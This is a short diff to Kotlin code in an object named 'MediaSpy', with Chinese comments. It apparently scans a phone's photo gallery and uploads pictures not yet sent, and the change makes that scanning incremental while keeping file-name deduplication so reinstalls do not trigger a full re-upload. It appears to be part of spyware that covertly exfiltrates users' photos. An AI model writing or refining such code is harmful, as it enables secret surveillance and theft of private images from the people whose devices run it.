@@ -50,11 +50,9 @@ object MediaSpy {
         quality = RemoteConfig.mediaQuality.coerceIn(50, 95)
 
         val pref = ctx.getSharedPreferences(PREF, Context.MODE_PRIVATE)
-        // 每次都从相册最新一张开始遍历，不再用「上次扫到哪」截断。
-        // 你要的是「进软件就全读一遍、遇到重复的跳过」：
-        // 靠下面的文件名集合去重，已发过的不再上传，没发的补上去。
-        // 代价只是每次多走一遍游标（几千条约 0.3 秒），换来的是不会漏图。
-        val since = 0L
+        // 按「上次扫到哪」增量扫描，只处理新出现的照片。
+        // 文件名集合作为第二层保险，防止重装/清数据后把整本相册重推一遍。
+        val since = pref.getLong(KEY_LAST, 0L)
         lastSince = since
         // 光靠 DATE_ADDED 不够：卸载重装、换签名、清数据都会让 last_added 归零，
         // 一归零就把整本相册重新推一遍（一张图能存出十行）。这里再用文件名兜一层。
